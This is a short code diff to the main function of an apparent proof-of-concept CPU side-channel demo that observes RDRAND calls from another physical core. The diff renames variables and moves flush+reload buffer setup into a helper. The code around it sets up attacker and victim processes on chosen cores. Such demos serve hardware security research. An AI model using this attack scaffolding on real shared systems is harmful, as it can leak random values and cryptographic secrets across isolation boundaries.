@@ -49,21 +49,18 @@ void attacker(int cpu, int reps, void* mem){
 int main(int argc, char **args) {
     printf("Demo 2: Observing RDRAND calls from another physical core.\n\n");
     _page_size = getpagesize();
-    get_same_core_cpus(&reader_cpu, &writer_cpu);
-    offcore_cpu = reader_cpu + 1;
-    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", reader_cpu, writer_cpu, offcore_cpu);
+    get_same_core_cpus(&attacker_cpu1, &attacker_cpu2);
+    offcore_cpu = attacker_cpu1 + 1;
+    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", attacker_cpu1, attacker_cpu2, offcore_cpu);
     fflush(stdout);
-    uint8_t *mem =
-            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
-                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
-    memset(mem, 0xFF, _page_size * 256);
+    uint8_t * mem = allocate_flush_reload_buffer();
     crosstalk_init(argc, args);
     memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
     byte_32 = prime_and_get_cpuid(CPUID_BRAND_STRING_3_PRIMITIVE);
     pid = fork();
-    if (!pid) victim_cpuid(0x80000002ul, writer_cpu);
+    if (!pid) victim_cpuid(0x80000002ul, attacker_cpu2);
     pid2 = fork();
-    if(!pid2) attacker(reader_cpu, 50, mem);
+    if(!pid2) attacker(attacker_cpu1, 50, mem);
     victim(offcore_cpu, 50);
     kill(pid2, SIGKILL);
     kill(pid, SIGKILL);
